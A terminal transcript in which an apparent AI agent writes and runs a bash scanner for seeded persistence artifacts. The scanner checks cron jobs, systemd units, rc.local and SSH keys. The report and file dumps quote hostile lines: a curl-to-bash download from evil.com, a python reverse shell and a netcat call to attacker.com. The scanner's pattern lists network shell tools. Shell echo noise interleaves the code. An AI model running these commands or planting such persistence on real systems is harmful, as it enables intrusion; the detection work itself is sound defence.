+      "sha256": "bff2acce2dbfa05e2ea0d8dc107adcab91e6d9b60e6ddd25707fe90a31bb4406",
+      "details": {
+        "line_number": 1,
+        "content_preview": "0 0 * * * root /app_target/scripts/evil.sh",
+        "user": "root"
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/etc/cron.d/backdoor_cron",
+      "sha256": "6079a3332be5f48d7a9c2be3367c35f859f35c92f829ff7eebceb9832f4becc6",
+      "details": {
+        "line_number": 1,
+        "content_preview": "* * * * * root /tmp/malicious_cron.sh",
+        "user": "root"
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/etc/cron.d/backdoor_cron",
+      "sha256": "6079a3332be5f48d7a9c2be3367c35f859f35c92f829ff7eebceb9832f4becc6",
+      "details": {
+        "line_number": 2,
+        "content_preview": "0 2 * * * user /usr/local/bin/suspicious_backup.sh",
+        "user": "user"
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/var/spool/cron/crontabs/root",
+      "sha256": "bc0d8b228099201b93731ff179d61264d5b337d51886291fd6c4631686008360",
+      "details": {
+        "line_number": 2,
+        "content_preview": "*/5 * * * * curl -s http://evil.com/payload.sh | bash",
+        "user": "root"
+      }
+    },
+    {
+      "type": "rc_local",
+      "path": "/app_target/etc/rc.local",
+      "sha256": "3be8928ea575fc75787095fddcb464f03541e81d4dcc991a3ac46e80ef055cd3",
+      "details": {
+        "line_number": 3,
+        "content_preview": "/tmp/startup_backdoor.sh &",
+        "user": null
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/app_target/home/victim/.ssh/authorized_keys",
+      "sha256": "3e44df731a6b9c0fb1c05abb102f2b6536965888f2cb99760bea4bf509720153",
+      "details": {
+        "line_number": 1,
+        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8...",
+        "user": "victim"
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/home/testuser/.ssh/authorized_keys",
+      "sha256": "cbdbc4bd87d89761730b3d10dc23a90239a51c91ea88322d0bbaf02e0fcbfedc",
+      "details": {
+        "line_number": 1,
+        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+        "user": "testuser"
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/home/testuser/.ssh/authorized_keys",
+      "sha256": "cbdbc4bd87d89761730b3d10dc23a90239a51c91ea88322d0bbaf02e0fcbfedc",
+      "details": {
+        "line_number": 2,
+        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8... attacker@unknown",
+        "user": "testuser"
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/root/.ssh/authorized_keys",
+      "sha256": "3e6582b49d8732b9ee6407cdb83fa6ab509fe0346c6279a7dd75f24f6381e11e",
+      "details": {
+        "line_number": 1,
+        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+        "user": "root"
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/root/.ssh/authorized_keys",
+      "sha256": "3e6582b49d8732b9ee6407cdb83fa6ab509fe0346c6279a7dd75f24f6381e11e",
+      "details": {
+        "line_number": 3,
+        "content_preview": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor",
+        "user": "root"
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/etc/systemd/system/persistence.service",
+      "sha256": "a7b556c604f0a3fe79b4559ebe499d56efddad3fa123e6fb2a84d90cbd49e004",
+      "details": {
+        "line_number": 7,
+        "content_preview": "ExecStart=/bin/bash -c \"while true; do /tmp/.hidden_backdoor.sh; sleep 60; done\"",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/.hidden_service.service",
+      "sha256": "65d6569d6817fefc41f465ef4f983a02b919f9d1674cf85ba476358489894707",
+      "details": {
+        "line_number": 4,
+        "content_preview": "ExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.co",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/initrd-switch-root.service",
+      "sha256": "ece01b55a2ed56de44631ced92e66c373ea461fb1f7c7731c38d51006fd66d6b",
+      "details": {
+        "line_number": 20,
+        "content_preview": "ExecStart=systemctl --no-block switch-root /sysroot",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/kmod-static-nodes.service",
+      "sha256": "fc75378e4878af8d609471832aae6b052485bb741a140569c0060424ec867099",
+      "details": {
+        "line_number": 20,
+        "content_preview": "ExecStart=/bin/kmod static-nodes --format=tmpfiles --output=/run/tmpfiles.d/static-nodes.conf",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/system-update-cleanup.service",
+      "sha256": "049067b451947c387b41de7912aec918bdd95951b828825e8b61206bed3b3aa9",
+      "details": {
+        "line_number": 35,
+        "content_preview": "ExecStart=/bin/rm -fv /system-update",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/systemd-volatile-root.service",
+      "sha256": "6be0e7ea3e65132d4f5c3d1d702078c8cd4ab36bc3a7dfeaf61a6255bfcf1f73",
+      "details": {
+        "line_number": 22,
+        "content_preview": "ExecStart=/lib/systemd/systemd-volatile-root yes /sysroot",
+        "user": null
+      }
+    }
+  ]
+}
+[?2004hroot@0d5a608a53ec:/app# cat > /app/scan_persistence.sh <<'EOF'
+[?2004l[?2004h> #!/bin/bash
+[?2004l[?2004h> # scan_persistence.sh - read-only scanner for seeded persistence artifacts
+[?2004l[?2004h> export LC_ALL=C
+[?2004l[?2004h> 
+[?2004l[?2004h> OUT=/app/persistence_report.json
+[?2004l[?2004h> SEP=$'\x1f'
+[?2004l[?2004h> RECORDS=""
+[?2004l[?2004h> KNOWN_KEYS_FILE=/app/known_ssh_keys.txt
+[?2004l[?2004h> declare -A SEEN=()
+[?2004list() {
+  local cb=[?2004h> declare -A KNOWN=()
+[?2004l[?2004h> 
+[?2004l[?2004h> SUSP_RE='(^|[^[:alnum:]_])/(var/)?tmp(/|[^[:alnum:]_]|$)|/dev/shm|base64|eval |curl |wget |/dev/tcp|mkfifo|ncat|netcat|bash -i|sh -i|python[0-9.]* -c|perl -e|[|] *(ba|z)?sh'
+[?2004l[?2004h> 
+[?2004lo[?2004h> if [[ -r $KNOWN_KEYS_FILE ]]; then
+[?2004l[?2004h>   while IFS= read -r k || [[ -n $k ]]; do
+[?2004l[?2004h>     [[ -n $k ]] && KNOWN["$k"]=1
+[?2004ln_cron_file [?2004h>   done < "$KNOWN_KEYS_FILE"
+[?2004ltc[?2004h> fi
+[?2004l[?2004h> 
+[?2004l[?2004h> json_escape() {
+[?2004l[?2004h>   local s=$1
+[?2004ld/s[?2004h>   s=${s//\\/\\\\}
+[?2004l[?2004h>   s=${s//\"/\\\"}
+[?2004l[?2004h>   printf '%s' "$s"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> clean() {
+[?2004l[?2004h>   local s
+[?2004l[?2004h>   s=$(printf '%s' "$1" | tr -d '[:cntrl:]')
+[?2004l[?2004h>   s=${s#"${s%%[![:space:]]*}"}
+[?2004l[?2004h>   s=${s%"${s##*[![:space:]]}"}
+[?2004lwalk_dir "$d" scan_systemd_file[?2004h>   printf '%s' "${s:0:100}"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> add_record() {
+[?2004l[?2004h>   local type=$1 path=$2 line=$3 preview user=$5 sha
+[?2004l[?2004h>   preview=$(clean "$4")
+[?2004l[?2004h>   sha=$(sha256sum -- "$path" 2>/dev/null | awk '{print $1}')
+[?2004l[?2004h>   [[ -z $sha ]] && return 0
+[?2004lth[?2004h>   RECORDS+="${type}${SEP}${path}${SEP}${sha}${SEP}${line:-null}${SEP}${preview}${SEP}${user}"$'\n'
+[?2004l[?2004h> }
+[?2004lTMP="[?2004h> 
+[?2004l$[?2004h> resolve() {
+[?2004l{OUT}.tmp.$$[?2004h>   local r
+[?2004l[?2004h>   r=$(readlink -f -- "$1" 2>/dev/null) || return 1
+[?2004l[?2004h>   [[ -n $r && -f $r && -r $r ]] || return 1
+[?2004l[?2004h>   printf '%s' "$r"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> seen_once() {
+[?2004lFS="$SEP" read -r[?2004h>   local key="$1|$2"
+[?2004l[?2004h>   [[ -n ${SEEN[$key]:-} ]] && return 1
+[?2004l[?2004h>   SEEN[$key]=1
+[?2004lntinue
+  total=[?2004h>   return 0
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> is_every_minute() {
+[?2004l[?2004h>   [[ $1 =~ ^([*]|[*]/1)([[:space:]]+([*]|[*]/1)){4}([[:space:]]|$) ]]
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> is_suspicious() {
+[?2004l[?2004h>   local t=$1 tok
+[?2004l[?2004h>   local -a toks
+[?2004l[?2004h>   grep -Eqi -- "$SUSP_RE" <<< "$t" && return 0
+[?2004lne
+ [?2004h>   read -ra toks <<< "$t"
+[?2004l[?2004h>   for tok in "${toks[@]}"; do
+[?2004l[?2004h>     case $tok in
+[?2004l[?2004h>       /*)
+[?2004l[?2004h>         case $tok in
+[?2004l[?2004h>           /usr/bin/*|/bin/*|/sbin/*|/usr/sbin/*|/usr/lib/*|/usr/libexec/*|/usr/share/*|/lib/*|/etc/*|/run/*|/sysroot|/sysroot/*|/system-update|/dev/null|/proc/*|/sys/*|/var/lib/*|/var/log/*) ;;
+[?2004l[?2004h>           *) return 0 ;;
+[?2004l[?2004h>         esac ;;
+[?2004l[?2004h>     esac
+[?2004l[?2004h>   done
+[?2004lpath")"[?2004h>   return 1
+[?2004l[?2004h> }
+[?2004lj"[?2004h> 
+[?2004l[?2004h> scan_cron_file() {
+[?2004l[?2004h>   local f=$1 spool=0 n=0 line t user idx
+[?2004l[?2004h>   local -a F
+[?2004l$item
+done <<[?2004h>   [[ $f == */spool/cron/* ]] && spool=1
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004lst[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] && continue
+[?2004lc_rc" "$[?2004h>     user=""
+[?2004l[?2004h>     if (( spool )); then
+[?2004l[?2004h>       user=$(basename -- "$f")
+[?2004l\n}\n' "$item[?2004h>     else
+[?2004l[?2004h>       read -ra F <<< "$t"
+[?2004l[?2004h>       idx=5
+[?2004l[?2004h>       [[ ${F[0]} == @* ]] && idx=1
+[?2004l[?2004h>       [[ -n ${F[$idx]:-} ]] && user=${F[$idx]}
+[?2004l& ech[?2004h>     fi
+[?2004lcri[?2004h>     if is_every_minute "$t" || is_suspicious "$t"; then
+[?2004l[?2004h>       add_record cron_job "$f" "$n" "$t" "$user"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_systemd_file() {
+[?2004l[?2004h>   local f=$1 base hidden=0 n=0 text value hitline="" hittext="" preview
+[?2004l[?2004h>   base=$(basename -- "$f")
+[?2004l[?2004h>   [[ $base == .* ]] && hidden=1
+[?2004l[?2004h>   while IFS= read -r text || [[ -n $text ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     if [[ $text =~ ^[[:space:]]*Exec(Start|StartPre|StartPost|Stop)?[[:space:]]*= ]]; then
+[?2004l[?2004h>       value=${text#*=}
+[?2004l[?2004h>       value=${value#"${value%%[![:space:]]*}"}
+[?2004l[?2004h>       value=${value#-}
+[?2004l[?2004h>       if [[ -z $hitline ]] && is_suspicious "$value"; then
+[?2004l[?2004h>         hitline=$n
+[?2004l[?2004h>         hittext=$text
+[?2004l[?2004h>       fi
+[?2004l[?2004h>     fi
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h>   if (( hidden )) || [[ -n $hitline ]]; then
+[?2004l[?2004h>     if [[ -n $hitline ]]; then
+[?2004l[?2004h>       preview=$hittext
+[?2004l[?2004h>     else
+[?2004l[?2004h>       preview="hidden unit file: $base"
+[?2004l[?2004h>     fi
+[?2004l[?2004h>     add_record systemd_unit "$f" "$hitline" "$preview" ""
+[?2004l[?2004h>   fi
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_rclocal_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* || $t == "exit 0" ]] && continue
+[?2004l[?2004h>     add_record rc_local "$f" "$n" "$t" ""
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_ssh_file() {
+[?2004l[?2004h>   local f=$1 n=0 line t user=root
+[?2004l[?2004h>   if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+[?2004l[?2004h>     user=${BASH_REMATCH[1]}
+[?2004l[?2004h>   fi
+[?2004l[?2004h>   while IFS= read -r line || [[ -n $line ]]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     t=${t%"${t##*[![:space:]]}"}
+[?2004l[?2004h>     [[ -z $t || $t == "#"* ]] && continue
+[?2004l[?2004h>     [[ -n ${KNOWN[$t]:-} ]] && continue
+[?2004l[?2004h>     add_record ssh_key "$f" "$n" "$t" "$user"
+[?2004l[?2004h>   done < "$f" 2>/dev/null
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> walk_dir() {
+[?2004l[?2004h>   local d=$1 cb=$2 e r
+[?2004l[?2004h>   while IFS= read -r -d '' e; do
+[?2004l[?2004h>     r=$(resolve "$e") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done < <(find "$d" -mindepth 1 -maxdepth 1 -print0 2>/dev/null | sort -z)
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list() {
+[?2004l[?2004h>   local cb=$1 p r
+[?2004l[?2004h>   shift
+[?2004l[?2004h>   for p in "$@"; do
+[?2004l[?2004h>     r=$(resolve "$p") || continue
+[?2004l[?2004h>     seen_once "$cb" "$r" || continue
+[?2004l[?2004h>     "$cb" "$r"
+[?2004l[?2004h>   done
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/cron.d /var/spool/cron/crontabs /app_target/etc/cron.d /app_target/var/spool/cron/crontabs; do
+[?2004l[?2004h>   walk_dir "$d" scan_cron_file
+[?2004l[?2004h> done
+[?2004l[?2004h> scan_file_list scan_cron_file /etc/crontab /app_target/etc/crontab
+[?2004l[?2004h> 
+[?2004l[?2004h> for d in /etc/systemd/system /usr/lib/systemd/system /run/systemd/system /app_target/etc/systemd/system /app_target/usr/lib/systemd/system /app_target/run/systemd/system; do
+[?2004l[?2004h>   walk_dir "$d" scan_systemd_file
+[?2004l[?2004h> done
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_file_list scan_rclocal_file /etc/rc.local /etc/rc.d/rc.local /app_target/etc/rc.local /app_target/etc/rc.d/rc.local
+[?2004l[?2004h> scan_file_list scan_ssh_file /root/.ssh/authorized_keys /app_target/root/.ssh/authorized_keys /home/*/.ssh/authorized_keys /app_target/home/*/.ssh/authorized_keys
+[?2004l[?2004h> 
+[?2004l[?2004h> mkdir -p /app
+[?2004l[?2004h> TMP="${OUT}.tmp.$$"
+[?2004l[?2004h> SORTED=$(printf '%s' "$RECORDS" | sort -t "$SEP" -k1,1 -k2,2)
+[?2004l[?2004h> total=0; c_cron=0; c_sys=0; c_rc=0; c_ssh=0
+[?2004l[?2004h> items=""
+[?2004l[?2004h> while IFS="$SEP" read -r type path sha line preview user; do
+[?2004l[?2004h>   [[ -z $type ]] && continue
+[?2004l[?2004h>   total=$((total + 1))
+[?2004l[?2004h>   case $type in
+[?2004l[?2004h>     cron_job) c_cron=$((c_cron + 1)) ;;
+[?2004l[?2004h>     systemd_unit) c_sys=$((c_sys + 1)) ;;
+[?2004l[?2004h>     rc_local) c_rc=$((c_rc + 1)) ;;
+[?2004l[?2004h>     ssh_key) c_ssh=$((c_ssh + 1)) ;;
+[?2004l[?2004h>   esac
+[?2004l[?2004h>   lj=$line
+[?2004l[?2004h>   [[ -z $lj || $lj == null ]] && lj=null
+[?2004l[?2004h>   uj=null
+[?2004l[?2004h>   [[ -n $user ]] && uj=$(printf '"%s"' "$(json_escape "$user")")
+[?2004l[?2004h>   item=$(printf '    {\n      "type": "%s",\n      "path": "%s",\n      "sha256": "%s",\n      "details": {\n        "line_number": %s,\n        "content_preview": "%s",\n        "user": %s\n      }\n    }' "$type" "$(json_escape "$path")" "$sha" "$lj" "$(json_escape "$preview")" "$uj")
+[?2004l[?2004h>   items+=${items:+,$'\n'}$item
+[?2004l[?2004h> done <<< "$SORTED"
+[?2004l[?2004h> 
+[?2004l[?2004h> {
+[?2004l[?2004h>   printf '{\n  "summary": {\n    "total_artifacts": %d,\n    "cron_jobs": %d,\n    "systemd_units": %d,\n    "rc_local_modifications": %d,\n    "ssh_keys": %d\n  },\n  "artifacts": [' "$total" "$c_cron" "$c_sys" "$c_rc" "$c_ssh"
+[?2004l[?2004h>   if [[ -n $items ]]; then
+[?2004l[?2004h>     printf '\n%s\n  ]\n}\n' "$items"
+[?2004l[?2004h>   else
+[?2004l[?2004h>     printf ']\n}\n'
+[?2004l[?2004h>   fi
+[?2004l[?2004h> } > "$TMP"
+[?2004l[?2004h> mv -f "$TMP" "$OUT" 2>/dev/null
+[?2004l[?2004h> exit 0
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@0d5a608a53ec:/app# chmod +x /app/scan_persistence.sh && echo 'script written'
+[?2004lscript written
+[?2004hroot@0d5a608a53ec:/app# /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; /app/scan_persistence.sh; echo "exit=$?"; md5sum /app/persistence_report.json; python3 -m json.tool /app/persistence_report.json >/dev/null && echo JSON_VALID; grep -E '"(type|path)"' /app/persistence_report.json
+[?2004lexit=0
+195092bf0778e35651b22391180b7de1  /app/persistence_report.json
+exit=0
+195092bf0778e35651b22391180b7de1  /app/persistence_report.json
+JSON_VALID
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/app_target/etc/cron.d/app_cron",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/cron.d/backdoor_cron",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/cron.d/backdoor_cron",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/etc/crontab",
+      [01;31m[K"type"[m[K: "cron_job",
+      [01;31m[K"path"[m[K: "/var/spool/cron/crontabs/root",
+      [01;31m[K"type"[m[K: "rc_local",
+      [01;31m[K"path"[m[K: "/app_target/etc/rc.local",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/app_target/home/victim/.ssh/authorized_keys",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/home/testuser/.ssh/authorized_keys",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/home/testuser/.ssh/authorized_keys",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/root/.ssh/authorized_keys",
+      [01;31m[K"type"[m[K: "ssh_key",
+      [01;31m[K"path"[m[K: "/root/.ssh/authorized_keys",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/etc/systemd/system/persistence.service",
+      [01;31m[K"type"[m[K: "systemd_unit",
+      [01;31m[K"path"[m[K: "/usr/lib/systemd/system/.hidden_service.service",
+[?2004hroot@0d5a608a53ec:/app# clear; cat -n /etc/crontab; echo '--- app_backdoor'; cat -A /app_target/etc/systemd/system/app_backdoor.service; echo '--- app_cron'; cat -A /app_target/etc/cron.d/app_cron; echo '--- app_target/etc/crontab'; ls -la /app_target/etc/crontab 2>&1; echo '--- report etc/crontab hits'; grep -n 'content_preview' /app/persistence_report.json | head -40
+[?2004l[H[J     1	# /etc/crontab: system-wide crontab
+     2	# Unlike any other crontab you don't have to run the `crontab'
+     3	# command to install the new version when you edit this file
+     4	# and files in /etc/cron.d. These files also have username fields,
+     5	# that none of the other crontabs do.
+     6	
+     7	SHELL=/bin/sh
+     8	# You can also override PATH, but by default, newer versions inherit it from the environment
+     9	#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+    10	
+    11	# Example of job definition:
+    12	# .---------------- minute (0 - 59)
+    13	# |  .------------- hour (0 - 23)
+    14	# |  |  .---------- day of month (1 - 31)
+    15	# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+    16	# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+    17	# |  |  |  |  |
+    18	# *  *  *  *  * user-name command to be executed
+    19	17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+    20	25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    21	47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    22	52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    23	#
+--- app_backdoor
+[Unit]$
+Description=Application Backdoor Service$
+[Service]$
+ExecStart=/bin/sh -c 'echo "backdoor" | nc attacker.com 1234'$
+$
+--- app_cron
+0 0 * * * root /app_target/scripts/evil.sh$
+--- app_target/etc/crontab
+ls: cannot access '/app_target/etc/crontab': No such file or directory
+--- report etc/crontab hits
+16:        "content_preview": "0 0 * * * root /app_target/scripts/evil.sh",
+26:        "content_preview": "* * * * * root /tmp/malicious_cron.sh",
+36:        "content_preview": "0 2 * * * user /usr/local/bin/suspicious_backup.sh",
+46:        "content_preview": "17 ** * *root    cd / && run-parts --report /etc/cron.hourly",
+56:        "content_preview": "25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
+66:        "content_preview": "47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )",
+76:        "content_preview": "52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
+86:        "content_preview": "*/5 * * * * curl -s http://evil.com/payload.sh | bash",
+96:        "content_preview": "/tmp/startup_backdoor.sh &",
+106:        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8...",
+116:        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+126:        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8... attacker@unknown",
+136:        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+146:        "content_preview": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor",
+156:        "content_preview": "ExecStart=/bin/bash -c \"while true; do /tmp/.hidden_backdoor.sh; sleep 60; done\"",
+166:        "content_preview": "ExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.co",
+[?2004hroot@0d5a608a53ec:/app# clear; cat > /app/scan_persistence.sh <<'EOF'
+[?2004l[?2004h> #!/bin/bash
+[?2004l[?2004h> # scan_persistence.sh - read-only scanner for seeded persistence artifacts
+[?2004l[?2004h> export LC_ALL=C
+[?2004l[?2004h> 
+[?2004l[?2004h> OUT=/app/persistence_report.json
+[?2004l[?2004h> SEP=$'\x1f'
+[?2004ler=root
+  if [[ $f =~ /home/([^/]+)/[.]ssh/authorized_keys$ ]]; then
+    user=${BASH_REMATCH[1]}
+  fi
+  while IFS= read -r line || [[ -n $line ]]; do
+    n=$((n+1))
+    t=${line#"${line%%[![:spa[?2004h> RECORDS=""
+[?2004l}
+ [?2004h> KNOWN_KEYS_FILE=/app/known_ssh_keys.txt
+[?2004l[?2004h> declare -A SEEN=()
+[?2004l[?2004h> declare -A KNOWN=()
+[?2004l[?2004h> 
+[?2004l[?2004h> SUSP_RE='(^|[^[:alnum:]_])/(var/)?tmp(/|[^[:alnum:]_]|$)|/dev/shm|base64|eval |curl |wget |/dev/tcp|mkfifo|(^|[ |;&(])n(c|cat)( |$)|bash -i|sh -i|python[0-9.]* -c|perl -e|[|] *(ba|z)?sh|attacker|backdoor|payload|reverse'
+[?2004l[?2004h> 
+[?2004lo[?2004h> if [[ -r $KNOWN_KEYS_FILE ]]; then
+[?2004lcontinue
+    "$cb[?2004h>   while IFS= read -r k || [[ -n $k ]]; do
+[?2004l[?2004h>     [[ -n $k ]] && KNOWN["$k"]=1
+[?2004l[?2004h>   done < "$KNOWN_KEYS_FILE"
+[?2004l_list() [?2004h> fi
+[?2004l[?2004h> 
+[?2004l[?2004h> json_escape() {
+[?2004l[?2004h>   local s=$1
+[?2004l[?2004h>   s=${s//\\/\\\\}
+[?2004l[?2004h>   s=${s//\"/\\\"}
+[?2004le "$p")[?2004h>   printf '%s' "$s"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004len_[?2004h> clean() {
+[?2004l[?2004h>   local s
+[?2004lr" || c[?2004h>   s=$(printf '%s' "$1" | tr '\t' ' ' | tr -d '[:cntrl:]')
+[?2004l[?2004h>   s=${s#"${s%%[![:space:]]*}"}
+[?2004l[?2004h>   s=${s%"${s##*[![:space:]]}"}
+[?2004l[?2004h>   printf '%s' "${s:0:100}"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> add_record() {
+[?2004lr "$d" scan_cr[?2004h>   local type=$1 path=$2 line=$3 preview user=$5 sha
+[?2004l[?2004h>   preview=$(clean "$4")
+[?2004l[?2004h>   sha=$(sha256sum -- "$path" 2>/dev/null | awk '{print $1}')
+[?2004lb/systemd/system /ru[?2004h>   [[ -z $sha ]] && return 0
+[?2004l[?2004h>   RECORDS+="${type}${SEP}${path}${SEP}${sha}${SEP}${line:-null}${SEP}${preview}${SEP}${user}"$'\n'
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> resolve() {
+[?2004l[?2004h>   local r
+[?2004l[?2004h>   r=$(readlink -f -- "$1" 2>/dev/null) || return 1
+[?2004lr "$d" scan_systemd_file
+done
+
+scan_file_list scan_rclocal_file /etc/rc.loca[?2004h>   [[ -n $r && -f $r && -r $r ]] || return 1
+[?2004l[?2004h>   printf '%s' "$r"
+[?2004ll /app_target/etc/r[?2004h> }
+[?2004l[?2004h> 
+[?2004ld[?2004h> seen_once() {
+[?2004l/rc.local
+scan[?2004h>   local key="$1|$2"
+[?2004l[?2004h>   [[ -n ${SEEN[$key]:-} ]] && return 1
+[?2004lh_file /root/.ssh/authorized_keys /app_ta[?2004h>   SEEN[$key]=1
+[?2004l[?2004h>   return 0
+[?2004l[?2004h> }
+[?2004lke[?2004h> 
+[?2004l[?2004h> is_every_minute() {
+[?2004l[?2004h>   [[ $1 =~ ^([*]|[*]/1)([[:space:]]+([*]|[*]/1)){4}([[:space:]]|$) ]]
+[?2004l[?2004h> }
+[?2004l$[?2004h> 
+[?2004l[?2004h> is_stock_cron() {
+[?2004l[?2004h>   [[ $1 =~ ^[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+[0-9*/,-]+[[:space:]]+root[[:space:]]+(cd / \&\& )?(test -x /usr/sbin/anacron \|\| \( cd / \&\& )?run-parts --report /etc/cron\.(hourly|daily|weekly|monthly)\)?$ ]]
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> is_suspicious() {
+[?2004lcron + 1)) ;;
+    sys[?2004h>   local t=$1 tok
+[?2004l=[?2004h>   local -a toks
+[?2004l[?2004h>   grep -Eqi -- "$SUSP_RE" <<< "$t" && return 0
+[?2004l[?2004h>   read -ra toks <<< "$t"
+[?2004l[?2004h>   for tok in "${toks[@]}"; do
+[?2004l[?2004h>     case $tok in
+[?2004l[?2004h>       /*)
+[?2004l[?2004h>         case $tok in
+[?2004l[?2004h>           /|/usr/bin/*|/bin/*|/sbin/*|/usr/sbin/*|/usr/lib/*|/usr/libexec/*|/usr/share/*|/lib/*|/etc/*|/run/*|/sysroot|/sysroot/*|/system-update|/dev/null|/proc/*|/sys/*|/var/lib/*|/var/log/*) ;;
+[?2004l[?2004h>           *) return 0 ;;
+[?2004l[?2004h>         esac ;;
+[?2004l[?2004h>     esac
